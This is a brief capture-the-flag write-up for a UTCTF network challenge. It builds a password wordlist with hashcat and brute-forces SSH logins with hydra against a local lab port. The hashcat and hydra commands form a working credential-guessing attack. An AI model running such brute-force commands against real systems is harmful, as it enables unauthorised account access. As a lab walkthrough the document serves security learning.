 # Problem Title Pom Poko Ports
 * **Event:** UTCTF
 * **Problem Type:** Network
 * **(Optional) Tools Required / Used:** hashcat, hydra
 
 ## Steps

 #### Step 1
P1 hints at a username format {first initial}{last name}
p2 hints at users and "abracadabra" as passwords.
Google magic phrases and put them in a wordlist
p2 mentions adding a special character or 2:
   hashcat -a 6 --force customlist.txt ?s?s --stdout > wordlist2.txt
create your list of users
   hashcat -a 6 --force wordlist3.txt ?s --stdout > wordlist.txt
run hydra (on specific port)
   hydra -L users -P wordlist.txt 127.0.0.1 ssh -s 8722
login to ssh
get greated by the flag :)


 #### Step 2
get greated by the flag ¯\_(ツ)_/¯
